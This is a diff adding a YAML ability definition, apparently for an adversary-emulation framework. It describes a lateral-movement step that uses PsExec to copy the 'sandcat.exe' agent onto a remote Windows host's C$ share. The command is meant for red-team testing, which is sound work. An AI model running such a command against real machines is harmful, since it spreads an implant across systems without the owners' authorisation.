@@ -1,0 +1,14 @@
+---
+
+ - id: bddc0abc-07a0-41b7-813f-e0c64d9226b3
+  name: Copy Sandcat File
+  description: Copy Sandcat file using PsExec
+  tactic: Lateral-Movement
+  technique:
+    attack_id: T1105
+    name: Remote File Copy
+  executors:
+    windows:
+      command: |
+        C:\Windows\System32\PSTools\PsExec64.exe -accepteula \\#{remote.host.ip} -c -f #{files}\sandcat.exe \\#{remote.host.ip}\C$\Users\Public\
+      payload: sandcat.exe
